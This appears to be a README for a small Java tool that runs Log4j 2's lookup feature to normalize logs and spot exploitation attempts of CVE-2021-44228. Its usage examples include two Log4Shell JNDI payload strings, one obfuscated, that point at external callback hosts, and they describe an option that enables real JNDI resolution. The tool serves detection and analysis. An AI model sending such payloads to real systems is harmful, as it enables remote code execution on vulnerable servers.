# JndiLookup
Some tool to help analyzing Apache Log4j 2 CVE-2021-44228

This tool uses the "lookup" feature from log4j-2 to test against the JNDI vulnerability.
The objective is to easily run the lookup feature (to normalize logs for example or to do a real testing on some payload - please be cautious).

To build : "make" (for convenience, the JndiLookup.jar file is included in this git).

Once built, you can run the tool with "java -jar JndiLookup.jar" (the log4j directory with log4j binaries must be in the same path as the JndiLookup.jar)

With no argument, the JndiLookup tool read lines from stdin and "convert" them using the log4j lookup feature - this should be useful to normalize logs and search for exploitation attempts

For example : cat access.log | java -jar JndiLookup.jar


If you pass a string to the command line, the tool will convert this string and exists (please escape all the '$' characters).

For example : java -jar JndiLookup.jar java -jar JndiLookup.jar "\${jndi:\${lower:l}\${lower:d}a\${lower:p}://world443.log4j.bin\${upper:a}ryedge.io:80/callback}"

By default, the JNDI lookup is disabled (and replaced by a lookup function that will just add "jndi:" but it's possible to enable the real JNDI lookup by passing the "-X" parameter to JndiLookup ("-X" to be passed as the first parameter) ; PLEASE BE CAUTIOUS with this because it could lead to your system being compromised.

For example : java -jar JndiLookup.jar -X "\${jndi:ldap://w8pcb14reujq65vic39pz9amv.canarytokens.com/a}"



The following lookup are enabled in the log4j binariers used (2.15.0 for standard usage, 2.14.1 for JNDI-enabled usage) :
- log4j
- sys
- env
- main
- marker
- java
- base64
- lower
- upper
- date 
- ctx

Other lookup might be availabled depending on your environment :
- docker
- kubernetes
- spring
- jvmrunargs

[ Please see https://github.com/apache/logging-log4j2/blob/c30a1398a6697fb832c650870c44284d0052103e/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java for details on lookup plugin activation]


Please be aware this tool uses the real code from log4j lookup feature and it could be vulnerable because of other (non-JNDI) security issues.
